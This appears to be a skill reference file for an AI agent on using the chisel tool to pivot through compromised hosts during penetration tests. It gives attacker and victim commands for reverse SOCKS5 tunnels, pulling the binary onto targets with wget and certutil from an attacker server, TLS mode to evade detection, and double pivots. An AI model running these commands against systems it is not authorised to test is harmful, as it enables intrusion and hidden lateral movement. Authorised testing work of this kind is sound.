---
name: chisel
description: "Auth/lab ref: HTTP-based TCP/UDP tunneling tool for port forwarding and SOCKS5 proxying through firewalls."
license: MIT
compatibility: "Linux, Windows, macOS; Single binary, no dependencies."
metadata:
  author: AeonDave
  version: "1.0"
---

# Chisel

HTTP/HTTPS TCP tunneling — SOCKS5 proxy and port forwarding without TUN interfaces or root.

## Architecture

```
Attacker (server)  ←—HTTP tunnel—  Victim (client)  ——→  Internal network
  port 8080                         pivot host           192.168.1.0/24
```

Works where ligolo-ng can't: no root needed, no TUN interface, works through web proxies.

## Quick Start

```bash
# Attacker — start server
./chisel server -p 8080 --reverse

# Victim — connect client + open SOCKS5 proxy on attacker
./chisel client <attacker_ip>:8080 R:1080:socks

# Attacker — route tools via SOCKS5
proxychains nmap -sT 192.168.1.0/24
proxychains nxc smb 192.168.1.0/24
```

## Transfer Binary to Target

```bash
# Serve from attacker
python3 -m http.server 80

# Linux target
wget http://<attacker>/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Windows target
certutil -urlcache -split -f http://<attacker>/chisel.exe C:\Windows\Temp\chisel.exe
# or
iwr -Uri http://<attacker>/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
```

## Modes

### Reverse SOCKS5 (most common — attacker gets proxy)

```bash
# Attacker
./chisel server -p 8080 --reverse

# Victim (creates SOCKS5 on attacker:1080)
./chisel client <attacker>:8080 R:1080:socks
```

```bash
# proxychains.conf
socks5 127.0.0.1 1080

proxychains curl http://192.168.1.50
proxychains evil-winrm -i 192.168.1.50 -u admin -p pass
```

### Reverse Port Forward (expose internal port on attacker)

```bash
# Attacker
./chisel server -p 8080 --reverse

# Victim (forward internal 192.168.1.50:445 to attacker:4455)
./chisel client <attacker>:8080 R:4455:192.168.1.50:445

# Attacker uses attacker:4455 to reach internal SMB
smbclient -L //127.0.0.1 -p 4455 -U user
```

### Forward SOCKS5 (victim opens local SOCKS proxy)

```bash
# Victim starts server
./chisel server -p 8080 --socks5

# Attacker connects + gets SOCKS5 through victim
./chisel client <victim>:8080 1080:socks
```

### Forward Port (attacker reaches internal service directly)

```bash
# Victim starts server
./chisel server -p 8080

# Attacker: forward localhost:8888 → internal 192.168.1.100:80
./chisel client <victim>:8080 8888:192.168.1.100:80

curl http://127.0.0.1:8888
```

## HTTPS Mode (avoid cleartext HTTP detection)

```bash
# Attacker — server with TLS
./chisel server -p 443 --reverse --tls-key server.key --tls-cert server.crt

# Or self-signed (auto-generated)
./chisel server -p 443 --reverse

# Victim — skip cert verify
./chisel client --tls-skip-verify https://<attacker>:443 R:1080:socks
```

## Authentication (prevent unauthorized use)

```bash
# Attacker
./chisel server -p 8080 --reverse --auth user:secretpass

# Victim
./chisel client --auth user:secretpass <attacker>:8080 R:1080:socks
```

## Multiple Tunnels (single client connection)

```bash
# Victim creates both SOCKS5 and specific port forward
./chisel client <attacker>:8080 R:1080:socks R:4455:192.168.1.50:445
```

## Double Pivot

```
Attacker → Pivot1 → Pivot2 → Internal2
```

```bash
# Attacker — start server
./chisel server -p 8080 --reverse

# Pivot1 connects, opens SOCKS5 on attacker:1080
./chisel client <attacker>:8080 R:1080:socks

# Configure proxychains to use 127.0.0.1:1080
# From attacker, reach pivot2 via pivot1's SOCKS5:
proxychains ./chisel server -p 9090 --reverse &

# Pivot2 connects to pivot1:9090 (via pivot1's local service)
# Pivot2 client → 192.168.2.0/24 SOCKS5 on attacker:2080
./chisel client <pivot1_ip>:9090 R:2080:socks
```

## vs ligolo-ng

| Feature | chisel | ligolo-ng |
|---------|--------|-----------|
| Root required | No | Yes (TUN) |
| Speed | Medium (HTTP) | Fast (TUN layer) |
| Tool compatibility | proxychains needed | Native (TUN routes) |
| UDP support | Limited | Yes |
| Firewall bypass | Excellent (HTTP/S) | Requires raw TCP |
| Best for | No-root pivots, HTTP-allowed nets | Full network routing |

## Resources

| File | When to load |
|------|--------------|
| `references/proxychains.md` | proxychains config, dynamic chain, DNS leak prevention, tool compatibility |
